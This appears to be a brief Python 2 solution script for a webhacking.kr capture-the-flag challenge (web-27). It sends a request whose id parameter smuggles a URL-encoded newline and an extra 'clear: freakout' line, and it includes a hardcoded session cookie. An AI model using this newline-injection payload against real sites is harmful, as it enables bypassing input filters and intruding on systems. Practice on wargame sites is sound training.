#answer: http://webhacking.kr/challenge/web/web-27/?id=freakout%0aclear:%20freakout
import requests

url = "http://webhacking.kr/challenge/web/web-27/?id=freakout%0aclear:%20freakout"

headers = {
	"Cookie":"PHPSESSID=3771a272772a41afe329096cccbd8dc6",
	"Host":"webhacking.kr"
}


res = requests.get(url,headers=headers)
print res.content

